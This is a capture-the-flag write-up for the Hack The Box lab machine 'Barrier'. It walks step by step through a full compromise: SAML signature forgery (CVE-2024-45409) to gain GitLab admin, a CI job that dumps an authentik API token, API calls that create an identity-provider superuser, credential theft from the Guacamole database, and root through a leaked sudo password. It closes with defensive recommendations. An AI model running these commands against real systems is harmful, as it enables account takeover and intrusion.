# Barrier - Hack The Box Write-Up

## Machine Information

| Field            | Value                                                                                                                                                                                  |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Machine          | Barrier                                                                                                                                                                                |
| Platform         | Hack The Box                                                                                                                                                                           |
| Operating system | Linux                                                                                                                                                                                  |
| Difficulty       | Medium                                                                                                                                                                                 |
| Primary services | SSH, GitLab, Apache Tomcat, authentik, Apache Guacamole                                                                                                                                |
| Main techniques  | Source-code secret discovery, SAML signature bypass, CI/CD runner abuse, API token exposure, identity impersonation, database credential discovery, SSH key recovery, password leakage |

## Executive Summary

Barrier exposed several connected identity and administration services. A public GitLab repository contained hardcoded credentials for the user `satoru`. Those credentials worked against authentik, the identity provider used for single sign-on to GitLab and Apache Guacamole.

GitLab Community Edition `17.3.2` was vulnerable to CVE-2024-45409, a signature-verification flaw in the `ruby-saml` dependency. A legitimate SAML response issued for `satoru` was modified so that GitLab accepted it as belonging to the administrative user `akadmin`.

GitLab administrator access exposed a paused instance runner using the Docker executor. A tagged pipeline job ran inside a locally cached image and printed its environment. The runner had injected a privileged authentik API token into the job container. That token allowed a new authentik user to be created, assigned a password, and added to the authentik administrators group.

The new authentik administrator impersonated `maki`, whose identity was authorized to open a Guacamole connection named `Maintenance`. This provided a shell as `maki` on Barrier. Guacamole's database configuration then disclosed MariaDB credentials, and the connection-parameter table contained an encrypted SSH private key and its passphrase for `maki_adm`. Finally, a world-readable Bash history file exposed the `maki_adm` sudo password, resulting in root access.

```mermaid
flowchart LR
    A["Public GitLab repository"] --> B["Hardcoded satoru credentials"]
    B --> C["Signed SAML response"]
    C --> D["CVE-2024-45409"]
    D --> E["GitLab session as akadmin"]
    E --> F["Docker runner pipeline"]
    F --> G["Leaked AUTHENTIK_TOKEN"]
    G --> H["Create authentik administrator"]
    H --> I["Impersonate maki"]
    I --> J["Guacamole shell"]
    J --> K["Recover maki_adm SSH key"]
    K --> L["Password in Bash history"]
    L --> M["Root"]
```

## Conventions

The following placeholders replace changing lab values and sensitive material:

- `<TARGET_IP>`: current IP address of Barrier
- `<SATORU_PASSWORD>`: password found in the public GitLab commit
- `<FORGED_SAML_RESPONSE>`: patched and encoded SAML response
- `<AUTHENTIK_TOKEN>`: token disclosed by the CI job
- `<AUTHENTIK_ADMINS_GROUP_UUID>`: UUID of the authentik administrators group
- `<NEW_USER_PK>`: primary key returned when the new authentik user is created
- `<NEW_ADMIN_PASSWORD>`: password assigned to the new authentik account
- `<GUACAMOLE_DB_PASSWORD>`: MariaDB password from `guacamole.properties`
- `<SSH_KEY_PASSPHRASE>`: passphrase stored with the Guacamole SSH connection
- `<MAKI_ADM_PASSWORD>`: password recovered from Bash history

## Reconnaissance

### Port Discovery

A full TCP scan identified six exposed services:

```bash
nmap -sC -sV -p- -Pn --min-rate 3000 -v \
  -oN nmap/all-ports <TARGET_IP>
```

| Port | Service | Observation |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.9p1 on Ubuntu |
| 80/tcp | HTTP | nginx redirecting to `gitlab.barrier.vl` |
| 443/tcp | HTTPS | GitLab behind nginx |
| 8080/tcp | HTTP | Apache Tomcat and Guacamole |
| 9000/tcp | HTTP | authentik |
| 9443/tcp | HTTPS | authentik |

The certificate and HTTP redirect disclosed the GitLab hostname. Both names were added locally:

```bash
echo '<TARGET_IP> barrier.vl gitlab.barrier.vl' | \
  sudo tee -a /etc/hosts
```

### GitLab

`https://gitlab.barrier.vl` presented a GitLab Community Edition login page.

![GitLab login page](images/01-gitlab-login.png)

The unauthenticated `/explore` page exposed a public project named `gitconnect`, owned by `satoru`.

![Public gitconnect project](images/02-public-gitconnect-project.png)

Reviewing the project's commit history revealed a previous revision containing hardcoded credentials:

```text
Username: satoru
Password: <SATORU_PASSWORD>
```

### authentik

Port 9443 hosted authentik, which accepted the recovered `satoru` credentials.

![authentik login page](images/03-authentik-login.png)

After authentication, the application portal exposed integrations for GitLab and Guacamole.

![authentik application portal](images/04-authentik-application-portal.png)

This established authentik as the central identity provider for multiple services on the host.

### Tomcat and Guacamole

Port 8080 returned the default Apache Tomcat page. The `/guacamole` path redirected authentication through authentik.

![Tomcat and Guacamole discovery](images/05-tomcat-guacamole-discovery.png)

## GitLab Administrative Access

### Version and Target User Discovery

GitLab's `/help` page identified version `17.3.2`.

![GitLab Community Edition 17.3.2](images/06-gitlab-version.png)

Searching the public user directory for `adm` identified `akadmin`, whose numeric user ID was `1`. The low ID and username suggested an initial administrative account.

![Discovery of the akadmin user](images/07-akadmin-user-discovery.png)

### CVE-2024-45409

[CVE-2024-45409](https://nvd.nist.gov/vuln/detail/CVE-2024-45409) affects vulnerable versions of `ruby-saml`, which GitLab used to validate SAML responses. GitLab `17.3.2` falls below the patched `17.3.3` release.

The vulnerable library did not reliably bind signature validation to the exact XML assertion later consumed by the application. With access to any valid response signed by the identity provider, an attacker could construct a modified document that passed signature verification while carrying an attacker-selected `NameID`.

In this scenario:

1. authentik legitimately authenticated `satoru`.
2. authentik issued a signed SAML response for `satoru`.
3. The response was captured before it reached GitLab's callback.
4. The assertion identity was changed to `akadmin`.
5. The proof of concept rearranged the XML references so the vulnerable validator accepted the modified document.
6. GitLab created an authenticated session for `akadmin`.

> [!NOTE]
> The vulnerability itself does not require knowing the victim's password. The `satoru` credentials were useful because they provided a convenient way to obtain one valid identity-provider-signed SAML document, which is a prerequisite for the attack.

### Capturing and Patching the SAML Response

The Single Sign-On button initiated authentication through authentik. The resulting request to GitLab's callback contained a `SAMLResponse` parameter:

```text
https://gitlab.barrier.vl/users/auth/saml/callback
```

The captured value was decoded in CyberChef using the transformations observed for this response:

```text
URL Decode -> From Base64 -> Raw Inflate
```

The decoded XML was saved as `satoru.xml`. The [Synacktiv proof of concept](https://github.com/synacktiv/CVE-2024-45409) was then used to replace the assertion's `NameID` and create an encoded patched response:

```bash
git clone https://github.com/synacktiv/CVE-2024-45409.git
cd CVE-2024-45409

python3 CVE-2024-45409.py \
  -r satoru.xml \
  -n akadmin \
  -e
```

```text
[+] Parse response
[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Insert malicious reference
[+] Patch digest value
[+] Write patched file in response_patched.xml
```

The patched value was submitted to the SAML callback. Using `--data-urlencode` prevents Base64 characters from being interpreted as URL syntax:

```bash
curl -k -i -G \
  --data-urlencode 'SAMLResponse=<FORGED_SAML_RESPONSE>' \
  'https://gitlab.barrier.vl/users/auth/saml/callback'
```

A successful response returned `302 Found`, redirected to the GitLab home page, and issued a new `_gitlab_session` cookie. Importing the new session into the browser established access as `akadmin`.

```http
HTTP/2 302
location: https://gitlab.barrier.vl/
set-cookie: _gitlab_session=<REDACTED>
```

## GitLab Runner Abuse

### Discovering the Runner

The forged `akadmin` session opened the GitLab administrator area.

![GitLab administrator dashboard](images/08-gitlab-admin-dashboard.png)

The CI/CD runner page contained a paused instance runner using the Docker executor. It had the tag `auto_5e7f`.

![GitLab Docker runner](images/09-gitlab-docker-runner.png)

After the runner was activated, a blank project was created for a controlled pipeline.

![Creating a project for the runner job](images/10-create-runner-project.png)

### Understanding the Docker Executor

A Docker executor does not run pipeline commands directly on the GitLab server process. For each job it:

1. Selects an eligible runner whose tags satisfy the job's `tags` list.
2. Starts an isolated container from the configured `image`.
3. Clones or mounts the project into that container.
4. Injects GitLab CI variables and variables configured for that runner.
5. Executes the commands under `script` inside the job container.
6. Removes the container when the job finishes.

The job container does **not** automatically receive every environment variable from the Docker host. The exposed authentik token appeared because the runner configuration made it available to CI jobs. The `redis:alpine` image merely supplied a shell in which the job could run.
### Pipeline Configuration

The following `.gitlab-ci.yml` selected the runner and printed the job environment:

```yaml
image:
  name: redis:alpine
  pull_policy: if-not-present

stages:
  - build

job_build:
  stage: build
  script:
    - env
  tags:
    - auto_5e7f
```

| Directive | Purpose |
| --- | --- |
| `image.name` | Defines the container image used for the job |
| `pull_policy: if-not-present` | Reuses the local image when available |
| `script: env` | Prints variables injected into the job process |
| `tags: auto_5e7f` | Routes the job to the discovered runner |

![Uploading the CI configuration](images/11-upload-ci-configuration.png)

Committing the file automatically created a pipeline. Its output disclosed a privileged API token:

```text
AUTHENTIK_TOKEN=<AUTHENTIK_TOKEN>
```

This was an authentik **API bearer token**, not `AUTHENTIK_SECRET_KEY`. The token's practical privilege was demonstrated by its ability to enumerate users and modify authentik's identity database.

## authentik Administrative Takeover

### Validating the API Token

The token successfully authenticated to authentik's REST API:

```bash
TOKEN='<AUTHENTIK_TOKEN>'

curl -sS 'http://barrier.vl:9000/api/v3/core/users/' \
  -H "Authorization: Bearer ${TOKEN}" | jq
```

The response confirmed several identities:

```json
{
  "username": "akadmin",
  "is_superuser": true,
  "groups_obj": [
    {
      "name": "authentik Admins",
      "is_superuser": true
    }
  ]
}
```

The response also provided the UUID of the `authentik Admins` group, which was needed later.

### Creating an Administrator

A new user was created through the API:

```bash
curl -sS -X POST 'http://barrier.vl:9000/api/v3/core/users/' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"username":"superadmin","name":"superadmin"}' | jq
```

The API returned the new user's primary key as `<NEW_USER_PK>`. At creation time, the account was active but not a superuser.

A password was assigned using the user-specific endpoint:

```bash
curl -sS -X POST \
  'http://barrier.vl:9000/api/v3/core/users/<NEW_USER_PK>/set_password/' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"password":"<NEW_ADMIN_PASSWORD>"}'
```

The account was then added to the existing administrators group:

```bash
curl -sS -X POST \
  'http://barrier.vl:9000/api/v3/core/groups/<AUTHENTIK_ADMINS_GROUP_UUID>/add_user/' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"pk":<NEW_USER_PK>}'
```

Re-querying the account showed `is_superuser: true`, confirming that group membership inherited administrative privilege.

The new credentials successfully authenticated to authentik.

![Login as the new authentik administrator](images/12-authentik-superadmin-login.png)

## Initial Shell Through Guacamole

### User Impersonation

authentik administrators could impersonate other identities from **Directory -> Users**. Impersonating `maki` changed the active identity without knowing `maki`'s password.

![authentik impersonation of maki](images/13-impersonating-maki.png)

Because Guacamole trusted authentik for single sign-on and `maki` was authorized for the `Maintenance` connection, the impersonated identity received access to that connection.

![Guacamole Maintenance connection](images/14-guacamole-maintenance-connection.png)

Opening `Maintenance` provided an interactive shell on Barrier as `maki`.

![Shell as maki through Guacamole](images/15-guacamole-shell-as-maki.png)

```bash
id
```

```text
uid=1001(maki) gid=1001(maki) groups=1001(maki)
```

## Lateral Movement to `maki_adm`

### Guacamole Database Credentials

Searching Guacamole's configuration identified `/etc/guacamole/guacamole.properties`:

```bash
find / -name guacamole -type d 2>/dev/null
cat /etc/guacamole/guacamole.properties
```

```text
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: <GUACAMOLE_DB_PASSWORD>
```

The file was readable by `maki`. MariaDB was listening only on localhost, but the Guacamole credentials allowed direct access from the existing shell:

```bash
ss -tlnp | grep 3306
mysql -u guac_user -p guac_db
```

### Understanding the Guacamole Tables

`guacamole_user.password_hash` and `password_salt` are binary hash material. When selected directly in a terminal, the raw bytes appeared as corrupted characters; they were not plaintext passwords.

The important table was `guacamole_connection_parameter`. Guacamole uses this table to store protocol-specific settings for saved connections, including SSH usernames, private keys, and passphrases.

A targeted query makes the relationship clearer than `SELECT *`:

```sql
SELECT
    c.connection_name,
    p.parameter_name,
    p.parameter_value
FROM guacamole_connection AS c
JOIN guacamole_connection_parameter AS p
    ON p.connection_id = c.connection_id
WHERE p.parameter_name IN
    ('hostname', 'port', 'username', 'private-key', 'passphrase');
```

The results associated an encrypted RSA private key with the user `maki_adm` and included the key's passphrase:

```text
username:    maki_adm
private-key: -----BEGIN RSA PRIVATE KEY----- ... <REDACTED>
passphrase:  <SSH_KEY_PASSPHRASE>
```

Storing an encrypted key and its decryption passphrase in the same accessible database removes most of the protection provided by encrypting the key.

### SSH as `maki_adm`

The recovered key was saved locally and assigned restrictive permissions:

```bash
chmod 600 maki_adm.key
```

It was then used with the recovered passphrase:

```bash
ssh -i maki_adm.key \
  -o HostKeyAlgorithms=+ssh-rsa \
  maki_adm@<TARGET_IP>
```

`HostKeyAlgorithms=+ssh-rsa` permits negotiation with the server's legacy RSA/SHA-1 host key. It controls verification of the **server's** host key

```text
Enter passphrase for key 'maki_adm.key': <SSH_KEY_PASSPHRASE>
...
uid=1002(maki_adm) gid=1002(admin) groups=1002(admin)
```

## Privilege Escalation to Root

The `maki_adm` home directory contained a Bash history file owned by root but readable by all users:

```bash
ls -la ~/.bash_history
cat ~/.bash_history
```

```text
-rw-r--r-- 1 root root 26 Dec 22 2024 .bash_history
sudo su
<MAKI_ADM_PASSWORD>
```

`sudo` password prompts do not normally write passwords to shell history. The second line indicates that the password was most likely entered accidentally at a shell prompt and persisted as a command. The world-readable permission then exposed it to `maki_adm`.

The recovered password authenticated a privileged sudo session:

```bash
sudo -i
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

This completed the compromise of Barrier.

## Security Observations

| Observation | Impact | Recommended control |
| --- | --- | --- |
| Credentials remained in public Git history | Any unauthenticated user could recover a valid identity-provider account | Remove secrets from history, rotate exposed credentials, and enable secret scanning and pre-commit checks |
| GitLab used a vulnerable `ruby-saml` version | A valid signed assertion could be modified to impersonate another GitLab user | Upgrade to a patched GitLab release and monitor SAML authentication anomalies |
| An administrative runner could execute jobs for an attacker-controlled project | GitLab administration became code execution inside the CI environment | Restrict runner administration, scope runners to trusted projects, protect tags, and review instance-runner access |
| A privileged authentik token was injected into CI jobs | A pipeline could take over the central identity provider | Do not expose infrastructure tokens to untrusted jobs; use protected, masked, narrowly scoped, and short-lived secrets |
| authentik administrators could impersonate application users | Identity-provider compromise granted downstream Guacamole access | Limit impersonation privilege, require strong administrative authentication, and audit impersonation events |
| Guacamole database credentials were readable by a remote-session user | The user could enumerate saved connections and their authentication material | Restrict file permissions, use a dedicated low-privilege service context, and protect secrets through an external vault |
| An SSH private key and its passphrase were stored together | Database access became SSH access as `maki_adm` | Store private keys and passphrases separately, rotate the key, and use managed secret storage |
| Bash history exposed a sudo password | Access as `maki_adm` became root access | Correct history permissions, avoid entering secrets at shell prompts, rotate the password, and prefer key-based privileged workflows |

## Key Lessons

1. Removing a secret from the current Git revision does not remove it from repository history.
2. A SAML signature must be validated against the exact assertion the application consumes.
3. A Docker executor isolates the job process, but secrets deliberately injected by runner configuration remain visible inside that job.
4. A cached container image can make a CI attack possible even when the runner has limited external network access.
5. An identity provider is a high-value control plane because impersonation can cross application boundaries.
6. Binary password hashes should not be confused with plaintext; connection parameters were the actual source of reusable authentication material.
7. Encrypting a private key provides little protection when its passphrase is stored beside it.

## References

- [NVD: CVE-2024-45409](https://nvd.nist.gov/vuln/detail/CVE-2024-45409)
- [Synacktiv: CVE-2024-45409 proof of concept](https://github.com/synacktiv/CVE-2024-45409)
- [GitLab Runner: Docker executor](https://docs.gitlab.com/runner/executors/docker/)
- [authentik API: List users](https://api.goauthentik.io/reference/core-users-list/)
- [Apache Guacamole: Database authentication](https://guacamole.apache.org/doc/gug/jdbc-auth.html)
- [Apache Guacamole: Database schema reference](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)

